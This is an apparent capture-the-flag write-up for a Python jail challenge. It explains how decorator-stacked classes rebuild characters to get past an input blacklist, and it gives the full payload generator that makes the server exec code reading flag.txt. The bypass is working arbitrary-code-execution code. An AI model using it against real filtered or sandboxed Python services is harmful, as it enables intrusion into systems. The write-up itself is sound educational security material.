Wrapper that filters all input to the calculator program to make sure it
follows the blacklist.  
It is not necessary to fully understand this code. Just know it doesn't allow
any of the characters in the following string:  
"()[]{}_.#\"\'\\ABCDEFGHIJKLMNOPQRSTUVWXYZ"  
Check ti1337.py to see what the program actually does with valid input.

The comment at the top explains the challenge. Basically, we can execute
remotely arbitrary code (what we send is `exec`ed), as long as it doesn't
contain any of `()[]{}_.#\"\'\\ABCDEFGHIJKLMNOPQRSTUVWXYZ`. Uppercase letters
are not particularly problematic - there's no such place where lowercase can't
be used. The real problem is that we can't call functions, access attributes
and setup magic methods (forbidden underscores).

I looked through Python syntax from the documentation and discovered two key
features that I could use for function execution. These are class definitions
(although without proper function definitions (lambda are allowed though) and
decorators).

This is how decorators basically work - these code snippets are equivalent:  
```python  
@some_function  
class c:  
		pass  
```  
```python  
class c:  
   pass  
c = some_function(c)  
```

If we find functions that operate on single arguments, we could make a
payload.

I decided not to dig far and settled on writting an encoder. This is encoder:  
```python  
def export(x):  
   return f"""@chr  
@len  
@str  
class c{'1'*(x-0x14)}:pass"""  
def encode(s):  
   if any(ord(x) < 0x14 for x in s):  
       raise ValueError('cannot encode chars less than %d' % 0x14)  
   return ['c'+'1'*(ord(x) - 0x14) for x in s]  
```

This makes classes with long enough names, so that we can make a character
with code (for instance) 40, we make an empty class, that has string
representation 40 characters long, later apply `chr` on it. Final phase is to
make a dummy class and apply a lambda function, that takes a single argument,
but doesn't use it, it returns sum of class names, which is later feeded into
`exec`. Full payload generating script:

```python  
def export(x):  
   return f"""@chr  
@len  
@str  
class c{'1'*(x-0x14)}:pass"""  
def encode(s):  
   if any(ord(x) < 0x14 for x in s):  
       raise ValueError('cannot encode chars less than %d' % 0x14)  
   return ['c'+'1'*(ord(x) - 0x14) for x in s]

payload = 'print(open("flag.txt").read())'  
for i in map(ord, set(payload)):  
   print(export(i))  
  
print('fff=lambda x:' + '+'.join(encode(payload)))  
print('@eval')  
print('@fff')  
print('class d:pass')  
print()  
print()  
print()  
```
